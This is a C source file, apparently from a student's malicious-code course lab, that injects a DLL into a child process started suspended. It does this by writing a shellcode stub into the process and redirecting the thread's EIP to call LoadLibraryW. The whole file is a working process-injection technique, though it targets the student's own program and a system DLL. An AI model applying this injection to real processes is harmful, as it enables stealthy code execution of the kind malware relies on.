#include <windows.h>
#include <stdio.h>
#pragma warning(disable : 4996) 

//在子进程创建挂起时注入dll
//hProcess      被创建时挂起的进程句柄
//hThread       进程中被挂起的线程句柄
//szDllPath     被注入的dll的完整路径
BOOL StartHook(HANDLE hProcess, HANDLE hThread, TCHAR* szDllPath)
{
    BYTE ShellCode[30 + MAX_PATH * sizeof(TCHAR)] =
    {
        0x60,               //pushad
        0x9c,               //pushfd
        0x68,0xaa,0xbb,0xcc,0xdd,   //push xxxxxxxx(xxxxxxxx的偏移为3)
        0xff,0x15,0xdd,0xcc,0xbb,0xaa,  //call [addr]([addr]的偏移为9)
        0x9d,               //popfd
        0x61,               //popad
        0xff,0x25,0xaa,0xbb,0xcc,0xdd,  //jmp [Eip]([Eip]的偏移为17)
        0xaa,0xaa,0xaa,0xaa,        //保存loadlibraryW函数的地址(偏移为21)
        0xaa,0xaa,0xaa,0xaa,        //保存创建进程时被挂起的线程Eip(偏移为25)
        0,              //保存dll路径字符串(偏移为29)
    };
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    if (!GetThreadContext(hThread, &ctx))
    {
        printf("GetThreadContext() ErrorCode:[0x%08x]\n", GetLastError());
        return FALSE;
    }
    //在目标进程内存空间调拨一块可执行的内存
    LPVOID LpAddr = VirtualAllocEx(hProcess, NULL, 30 + MAX_PATH * sizeof(TCHAR), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (LpAddr == NULL)
    {
        printf("VirtualAllocEx() ErrorCode:[0x%08x]\n", GetLastError());
        return FALSE;
    }
    //获得LoadLibraryW函数的地址
    DWORD LoadDllAAddr = (DWORD)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (LoadDllAAddr == NULL)
    {
        printf("GetProcAddress() ErrorCode:[0x%08x]\n", GetLastError());
        return FALSE;
    }
    printf("原始Eip=0x%08x\n", ctx.Eip);
    //写入dllpath
    memcpy((char*)(ShellCode + 29), szDllPath, MAX_PATH);
    //写入push xxxxxxxx
    *(DWORD*)(ShellCode + 3) = (DWORD)LpAddr + 29;
    //写入loadlibraryA地址
    *(DWORD*)(ShellCode + 21) = LoadDllAAddr;
    //写入call [addr]的[addr]
    *(DWORD*)(ShellCode + 9) = (DWORD)LpAddr + 21;
    //写入原始Eip
    *(DWORD*)(ShellCode + 25) = ctx.Eip;
    //写入jmp [Eip]的[Eip]
    *(DWORD*)(ShellCode + 17) = (DWORD)LpAddr + 25;
    //把shellcode写入目标进程
    if (!WriteProcessMemory(hProcess, LpAddr, ShellCode, 30 + MAX_PATH * sizeof(TCHAR), NULL))
    {
        printf("WriteProcessMemory() ErrorCode:[0x%08x]\n", GetLastError());
        return FALSE;
    }
    //修改目标进程的Eip，执行被注入的代码
    ctx.Eip = (DWORD)LpAddr;
    if (!SetThreadContext(hThread, &ctx))
    {
        printf("SetThreadContext() ErrorCode:[0x%08x]\n", GetLastError());
        return FALSE;
    }
    printf("修改后Eip=0x%08x\n", ctx.Eip);
    return TRUE;
};

int main()
{
    STARTUPINFO sti;
    PROCESS_INFORMATION proci;
    memset(&sti, 0, sizeof(STARTUPINFO));
    memset(&proci, 0, sizeof(PROCESS_INFORMATION));
    sti.cb = sizeof(STARTUPINFO);
    wchar_t ExeName[MAX_PATH] = L"D:\\StudyFile\\2024Spring\\恶意代码\\实验四\\main.exe";//子进程的名字及启动参数
    wchar_t DllName[MAX_PATH] = L"C:\\Windows\\SysWOW64\\crtdll.dll";//被注入的dll的完整路径
    if (CreateProcess(NULL, ExeName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sti, &proci) == NULL)
    {
        printf("CreateProcess() ErrorCode:[0x%08x]\n", GetLastError());
        getchar();
        return 0;
    }
    if (!StartHook(proci.hProcess, proci.hThread, DllName))
    {
        TerminateProcess(proci.hProcess, 0);
        printf("Terminated Process\n");
        getchar();
        return 0;
    }
    ResumeThread(proci.hThread);
    CloseHandle(proci.hProcess);
    CloseHandle(proci.hThread);
    return 0;
}